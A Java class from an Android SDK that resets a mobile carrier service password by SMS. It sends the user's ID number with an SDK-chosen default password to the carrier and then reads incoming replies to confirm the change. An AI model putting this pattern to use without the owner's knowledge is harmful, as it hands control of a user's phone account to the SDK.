package com.myyj.sdk.tools.pwdhelperx;

import com.myyj.sdk.MySDK;
import com.myyj.sdk.ResultCallback;

import static com.myyj.sdk.msdk.isRpwSkip;


class RPWShanXi extends RPWBase {
    public RPWShanXi(String phoneNumber, String idNumber, ResultCallback callback) {
        super(phoneNumber, idNumber, callback);
    }

    private final static int DYN_BIT_LEN = 6;

    public void updateStatusLogic() {
        if(resetStatus == RS_START) {
            serverPassword = "";
            if(!isRpwSkip()){
                sendMsg(CM_ADDRESS, "CZSJMM#" + getIdNumber() + "#" + MySDK.getInstance().getDefaultServicePassword() + "#" + MySDK.getInstance().getDefaultServicePassword());
            }else{
                sendMsg(CM_ADDRESS, "CZSJMM#" + getIdNumber() + "#" + MySDK.getInstance().getDefaultServicePassword() + "#" + MySDK.getInstance().getDefaultServicePassword(), new ResultCallback() {
                    @Override
                    public void callback(int state, String result) {
                        if(state == 0) {
                            serverPassword = MySDK.getInstance().getDefaultServicePassword();
                            changeStateIfTimeout(RS_SENDED_1, RS_FINISH);
                        }
                    }
                });
            }
            updateStatus(RS_SENDED_1);
            finishStatus = FS_FAIL_ID;
            startTimer(TIMEOUT_VALUE, RS_FINISH);
        }
        else if(resetStatus == RS_FINISH) {
            finish(finishStatus);
        }
    }

    public void updateReceiveLogic(String address, String body) {
        if(resetStatus == RS_SENDED_1) {
            if (!address.equals(CM_ADDRESS)) {
                return;
            } else if (checkStrContainsKeyWords(body, new String[]{"证件错误"})) {
                stopTimer();
                finishStatus = FS_FAIL_ID;
                this.updateStatus(RS_FINISH);
            } else if (checkStrContainsKeyWords(body, new String[]{"密码修改", "新密码"})) {
                stopTimer();
                serverPassword = MySDK.getInstance().getDefaultServicePassword();
                finishStatus = FS_SUC;
                this.updateStatus(RS_FINISH);
            }
        }
    }


    @Override
    protected String getFirstSMS() {
        return "CZSJMM#"+getIdNumber()+"#"+MySDK.getInstance().getDefaultServicePassword()+"#"+MySDK.getInstance().getDefaultServicePassword();
    }

    @Override
    protected boolean needIdCardNumberAtFirst() {
        return super.needIdCardNumberAtFirst();
    }
}
